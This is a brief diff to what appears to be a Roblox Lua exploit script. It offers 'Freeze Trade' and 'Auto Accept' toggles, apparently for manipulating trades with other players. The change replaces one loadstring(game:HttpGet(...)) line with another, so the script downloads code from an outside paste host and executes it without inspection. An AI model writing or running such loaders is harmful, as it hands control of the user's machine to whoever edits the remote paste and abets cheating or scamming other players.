@@ -122,4 +122,4 @@ end
 
 createToggle("Freeze Trade", 90)
 createToggle("Auto Accept", 160)
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjNlNDMxN2UyLWU5ODAtNGRmZS1iZGJlLWY1YWZiYjMwMTRkMSIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/eaWP585D04/0", true))()
